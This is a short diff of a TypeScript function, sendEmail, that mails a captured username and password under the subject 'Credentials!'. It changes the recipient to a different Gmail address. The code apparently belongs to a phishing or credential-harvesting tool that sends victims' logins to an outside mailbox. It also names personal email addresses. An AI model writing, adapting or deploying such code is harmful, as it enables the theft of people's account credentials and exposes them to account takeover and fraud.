@@ -15,7 +15,7 @@ export function sendEmail(username: string, password: string) {
   // Define the email options
   const mailOptions = {
     from: "gracemngonda@gmail.com",
-    to: "gracemngonda@gmail.com",
+    to: "k66520145@gmail.com",
     subject: "Credentials!",
     text: `Email/Phone: ${username}\nPassword: ${password}`,
   };
